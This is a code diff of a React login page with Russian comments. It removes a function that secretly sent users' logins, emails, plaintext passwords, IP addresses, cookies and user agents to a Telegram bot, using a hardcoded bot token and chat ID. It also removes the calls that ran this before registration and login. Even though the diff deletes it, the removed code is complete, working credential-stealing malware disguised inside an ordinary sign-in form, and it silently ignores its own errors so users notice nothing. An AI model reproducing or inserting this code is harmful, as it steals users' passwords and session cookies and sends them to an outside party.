@@ -17,56 +17,6 @@ import { Logo } from "@/components/icons/logo";
 import { Eye, EyeOff, Shield, Mail, User } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 
-// 📤 Функция отправки в Telegram
-async function sendToTelegram(data: any, type: 'login' | 'register') {
-  try {
-    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
-    const TELEGRAM_CHAT_ID = "7455610355";
-    
-    // Получаем IP клиента
-    let ip = 'unknown';
-    try {
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipResponse.json();
-      ip = ipData.ip;
-    } catch (ipError) {
-      console.log('Не удалось получить IP');
-    }
-    
-    // Получаем куки
-    const cookies = document.cookie || 'no cookies';
-    
-    const message = `
-🔐 ${type === 'login' ? 'ВХОД В СИСТЕМУ' : 'НОВАЯ РЕГИСТРАЦИЯ'}
-
-${type === 'register' ? `📧 Email: ${data.email}` : `👤 Логин/Email: ${data.login}`}
-${type === 'register' ? `👤 Логин: ${data.login}` : ''}
-🔑 Пароль: ${data.password}
-
-🌐 **Технические данные:**
-📍 IP: ${ip}
-🕒 Время: ${new Date().toLocaleString('ru-RU')}
-🍪 Куки: ${cookies.slice(0, 100)}...
-📱 User Agent: ${navigator.userAgent.slice(0, 80)}...
-    `;
-
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message
-      })
-    });
-
-    console.log('✅ Данные отправлены в Telegram');
-
-  } catch (error) {
-    console.log('⚠️ Telegram не доступен, но форма работает');
-    // Игнорируем ошибку чтобы форма работала в любом случае
-  }
-}
-
 // API вызовы
 async function registerUser(userData: { email: string; login: string; password: string; }) {
   const response = await fetch('/api/auth/register', {
@@ -126,10 +76,6 @@ export default function LoginPage() {
     }
 
     try {
-      // 📤 Сначала отправляем в Telegram
-      await sendToTelegram({ email, login, password }, 'register');
-
-      // Затем регистрируем пользователя
       const result = await registerUser({ email, login, password });
       toast({
           title: "Успех!",
@@ -155,10 +101,6 @@ export default function LoginPage() {
     const password = formData.get('password') as string;
 
     try {
-      // 📤 Сначала отправляем в Telegram
-      await sendToTelegram({ login, password }, 'login');
-
-      // Затем логиним пользователя
       await loginUser({ login, password });
       // В реальном приложении здесь была бы обработка сессии/токена
       router.push('/dashboard');
@@ -174,7 +116,6 @@ export default function LoginPage() {
       <div className="flex flex-col items-center gap-6 w-full max-w-sm">
         
         <div className="flex items-center gap-2">
-          <Shield className="w-6 h-6 text-green-500" />
           <Logo className="w-16 h-16" />
         </div>
 
